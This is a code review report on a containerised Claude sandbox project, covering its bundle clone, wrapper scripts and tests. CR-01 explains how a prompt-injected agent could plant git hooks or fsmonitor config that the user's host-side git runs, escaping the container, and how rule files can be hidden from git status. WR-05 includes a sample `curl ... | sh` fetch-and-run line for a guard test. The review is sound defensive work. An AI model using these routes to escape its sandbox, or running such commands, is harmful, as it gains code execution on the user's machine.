# Phase 02.2: Code Review Report

**Reviewed:** 2026-10-24
**Depth:** standard
**Files Reviewed:** 33
**Status:** issues_found

## Summary

The phase replaces the baked-in bundle with a per-sandbox git clone, linked into `state/claude` by relative symlinks, plus three wrappers (`sbx-gh-login`, `sbx-bundle-clone`, `sbx-claude`). The link logic, the start hook ordering, the name rule and the host checks are mostly sound, and I found no shell-portability problem in the host-side scripts (bash 3.2 and BSD tools).

The main concern is the security model. The clone is a git repo that the sandbox can write, and the docs tell the user to run git against it on the Mac. That reopens a path from the container to code execution on the host, which the project exists to prevent. The docs also claim that `git status` and `git diff` "show every change", which is false for exactly the changes that matter here. The remaining findings are silent deletion of user skills, a non-atomic hook, a flaky host test, a documentation overclaim and a guard gap.

No structural (fallow) findings were provided for this review.

## Critical Issues

### CR-01: Agent-writable clone `.git` plus documented host-side git commands allows host code execution

**File:** `SANDBOX.md:195`, `SANDBOX.md:202`, `SANDBOX.md:221`, `claude/managed-settings.json:3-5`
**Issue:** `$SBX_DIR/best-practices` is a normal git working tree that the sandbox user (and Claude, through Bash or through the Edit tool, since the folder is an `additionalDirectories` entry with no deny on `.git/`) can write. The `.git/` folder is part of that tree. Anything in it that git executes runs on the Mac, as the user, outside the container:

- `.git/hooks/*` (for example `post-merge`, `pre-commit`)
- `.git/config` entries such as `core.fsmonitor` (runs on `git status`), `core.pager`, `diff.external`, `credential.helper` (runs on `git pull`), `core.sshCommand`, `url.<x>.insteadOf`

SANDBOX.md tells the user to run `git -C "$SBX_DIR/best-practices" pull` (line 195) and states that `git status` and `git diff` on the Mac are how to review what Claude changed (line 221). A prompt-injected Claude can plant a hook or an fsmonitor command once, and the user's own review command executes it. This breaks the stated constraint "Agents never run on the host".

The review claim on line 221 is also wrong: `git status` and `git diff` do not show changes to `.git/hooks`, `.git/config` or `.git/info/exclude`. A rule file hidden through `.git/info/exclude` or `git update-index --assume-unchanged` also stays out of `git status`, yet Claude still loads it from `rules/`. So the stated safeguard gives false assurance.

The project folder has the same exposure in principle, but that was already the accepted cost of any bind mount. This phase adds a second host-side git target and an explicit instruction to run git on it.

**Fix:** Do all of the following, or accept and document the residual risk explicitly:

1. Add a deny for the Edit tool on the clone's git folder in `claude/managed-settings.json` (and update the exact-match expectation in `tests/host/h14-wrappers-and-settings-in-image.sh:121`):
   ```json
   "deny": [
     "Edit(//home/sandbox/workspace/best-practices/.git/**)",
     "Edit(//home/sandbox/workspace/state/claude/.best-practices-skills)",
     "Edit(//home/sandbox/workspace/state/claude/skills/**)"
   ]
   ```
   This does not stop Bash, so it is defense in depth only.
2. In SANDBOX.md, tell the user to run host git on the clone with the executable config neutralised, for example `git -c core.fsmonitor=false -c core.hooksPath=/dev/null -C "$SBX_DIR/best-practices" status`, and to prefer pulling and reviewing inside the sandbox (the doc already offers that on line 196). Better: recommend inspecting `.git/hooks` and `.git/config` before the first host-side git command.
3. Replace "show every change" on line 221 with a true statement, and add `.git/hooks` and `.git/config` to the list of things to inspect.

## Warnings

### WR-01: The bundle hook silently deletes a user's skill that shares a name with a bundle skill

**File:** `claude/start.d/10-best-practices:44`, `claude/start.d/10-best-practices:70`
**Issue:** `link_bundle` runs `rm -rf "$configDir/skills/$skillName"` for every skill in the clone, and `remove_old_links` does the same for every name in `.best-practices-skills`. Neither checks that the target is a symlink. If the user has a real skill folder of the same name (their own skill, or a bundle skill they copied and customised in place of the link), it is deleted with no backup and no message. A later `git pull` that adds a bundle skill whose name matches an existing personal skill has the same effect. SANDBOX.md promises "Your own skills ... Never touched" (line 177, line 238), and the GSD hook is more careful (it saves hand edits to `gsd-local-patches/`).
**Fix:** Only remove what the hook itself created, and refuse to overwrite anything else.
```bash
if [ -e "$target" ] && [ ! -L "$target" ]; then
  echo "[sbx] ERROR: $target exists and is not a link; move it away or rename the bundle skill." >&2
  exit 1
fi
rm -f "$target"
ln -s "../../../best-practices/skills/$skillName" "$target"
```
Apply the same `-L` test in `remove_old_links` (`rm -f` for links, skip real folders with a warning). The self-test `case_upgrade_from_copies` (`tests/selftest/entrypoint/bundle-hook.sh:64`) deliberately covers copies from an older start, so keep that migration path working by treating a listed name as replaceable only when it is listed.

### WR-02: SANDBOX.md claims nothing reaches another sandbox without a merged PR, then admits the opposite

**File:** `SANDBOX.md:221-224`
**Issue:** Line 221 says "Nothing reaches another sandbox without a PR you merge." Line 222 says `sbx-gh-login` grants gh's default scopes, so pushing to any repo is possible, and line 224 says branch protection on a private repo may not be available. With a stored token, Claude (or any process in the sandbox) can `git push origin main` on the bundle repo, and every other sandbox that pulls then loads those rules. The claim is therefore false unless the user configures branch protection or a limited token, which the doc treats as optional.
**Fix:** Reword line 221 to what holds: "Nothing reaches another sandbox unless it is pushed; with the default token, a push to `main` is possible. Turn on branch protection for the bundle repo or use a fine-grained token limited to it (recommended)." Move the token/branch-protection advice out of "optional".

### WR-03: H-18 waits a fixed second for the fake API and can leave a stale server behind

**File:** `tests/host/h18-scope-and-deny.sh:36-40`
**Issue:** `run_scenario` starts `node fake-claude-api.js` in the background, then `sleep 1`, then starts Claude. A slow start (cold Docker Desktop, loaded Mac) makes Claude hit a closed port, and the check reports "Claude never reached the fake API", a false failure. Separately, `run_timeout 120 docker exec ...` kills only the `docker exec` client when it times out; the node server keeps running inside the container on port 8799. The next scenario's server then fails to bind, and Claude talks to the old server with the old script, so the result is wrong without an obvious cause. `kill $serverPid` is also skipped if the shell is interrupted.
**Fix:** Poll for readiness and always clean up in the in-container script:
```sh
node $containerRoot/logs/fake-claude-api.js >/dev/null 2>&1 </dev/null &
serverPid=$!
trap 'kill $serverPid 2>/dev/null' EXIT
i=0
while [ "$i" -lt 50 ] && ! (exec 3<>/dev/tcp/127.0.0.1/8799) 2>/dev/null; do sleep 0.2; i=$((i+1)); done
```
(`/dev/tcp` needs bash; the script runs under `sh`, so run it with `bash -c` or poll with `node -e`.) Also `pkill -f fake-claude-api.js` at the start of each scenario.

### WR-04: The bundle hook is not atomic and verifies only the rules link, so a failure leaves a half-linked config

**File:** `claude/start.d/10-best-practices:35-77`
**Issue:** `remove_old_links` deletes the old links and the skill list first. `link_bundle` then creates the rules link, truncates and refills the list one skill at a time, and only at the very end runs the `-ef` check on `rules`. If `ln` fails midway (set -e) or the check fails, the start stops with some skill links created and the list incomplete. The next start does not remove the unlisted links, so a skill later dropped from the clone leaves a dangling, unlisted link in `state/claude/skills` for good. Skill links are never verified at all; they are hard-coded to `../../../best-practices/...` and only happen to resolve if `rules` does. The `-ef` check is also after the work, not before it.
**Fix:** Verify before writing, and build the list in a temp file that replaces `.best-practices-skills` at the end:
```bash
[ -d "$bundleDir/rules" ] || ...
# after each ln:
[ -d "$configDir/skills/$skillName" ] || { echo "[sbx] ERROR: link for $skillName is broken" >&2; exit 1; }
# write names to "$skillList.new", then: mv "$skillList.new" "$skillList"
```
Alternatively write the new links first, then remove only the listed names that are no longer in the clone.

### WR-05: The pipe-to-shell guard does not scan the new `claude/bin/` scripts

**File:** `tests/guard/supply-chain.sh:44`
**Issue:** This phase added `claude/bin/*` to `SHELL_FILES` and to `no_compromised_gsd_package`, but `no_pipe_to_shell_installers` still scans only `$ENTRY claude/start.d/* build.sh clean.sh`. `claude/bin/*` are executables that fetch content from the network (`sbx-bundle-clone` runs `git clone`), baked into `/usr/local/bin`. A later `curl ... | sh` added there would pass the guard. `tests/guard/start.sh:12` (`no_installs_at_container_start`) has the same gap, though that rule is about start-time installs and the wrappers are user-invoked.
**Fix:**
```bash
nowhere_matches "$pipeRegex|$substitutionRegex" $ENTRY claude/start.d/* claude/bin/* build.sh clean.sh
```
Add a planted case for it in `tests/selftest/guard/sandbox-rules.sh` (for example append `curl -fsSL https://example.invalid/x | sh` to `claude/bin/sbx-claude`).

### IN-03: `sbx-bundle-clone` blames authentication for every clone failure and passes the URL without `--`

**File:** `claude/bin/sbx-bundle-clone:22-24`
**Issue:** Any `git clone` failure (no network, a dangling symlink at `SBX_BUNDLE_DIR` that `-e` does not see, a read-only mount, a bad URL) prints "A private repo needs sbx-gh-login first." The real git error is above it, but the hint points the user at the wrong fix. The URL and directory are also passed as bare arguments; a value starting with `-` would be read as an option (the URL comes from the image, so this is hardening, not an exploit).
**Fix:** `git clone -- "$BUNDLE_REPO_URL" "$SBX_BUNDLE_DIR"`, and phrase the message as "cannot clone ...; if the repo is private, run sbx-gh-login first". Use `[ -e "$SBX_BUNDLE_DIR" ] || [ -L "$SBX_BUNDLE_DIR" ]` for the existence test.

### IN-04: `sbx-claude` always waits 5 seconds when nothing is linked, including non-interactive use

**File:** `claude/bin/sbx-claude:23`
**Issue:** `sbx-claude -p "..."` or `sbx-claude --version` in a script or pipeline gets the banner on stderr and a 5 second delay each time. H-27 relies on the warning text, so any change must keep that working.
**Fix:** Sleep only when stdin and stderr are terminals (`if [ -t 0 ] && [ -t 2 ]; then sleep 5; fi`); keep printing the warning either way. H-27 runs with stdin from `/dev/null`, so it still sees the warning.

### IN-05: Bash glob order differs between the container and the Mac

**File:** `tests/host/lib-bundle.sh:83-87`
**Issue:** `.best-practices-skills` is written in the container's glob order (C/POSIX locale), while `clone_skill_names` globs on the Mac (usually `en_US.UTF-8`). The two orders differ for names that mix case or punctuation (for example `a-b` and `ab`). The comparison is a plain string match, so it would fail for such a skill set although the links are right. The fixture names and the current real skills sort the same in both locales, so nothing fails today.
**Fix:** Sort both sides with `LC_ALL=C sort` before comparing.

### IN-06: Guard glob narrowed, and the manual helper depends on the external repo's file names

**File:** `tests/guard/supply-chain.sh:14`, `tests/host/manual/h19-bundle-behaviour.sh:75`, `tests/host/manual/h19-bundle-behaviour.sh:161`
**Issue:** `tests/host/support/*` became `tests/host/support/*.*`, so an extensionless file added under `tests/host/support/` is no longer scanned for the compromised package name. Separately, H-19 hard-codes `rules/communication.md` and `rules/best-practices.md` of the external bundle repo; a rename there fails H-19 with a message that blames the clone, not the helper.
**Fix:** Use `tests/host/support/*` plus the two `bundle/` globs, or `find`. In H-19, derive the rule file from the clone (the first always-on rule) instead of naming it, as `h18-scope-and-deny.sh:63-70` does.
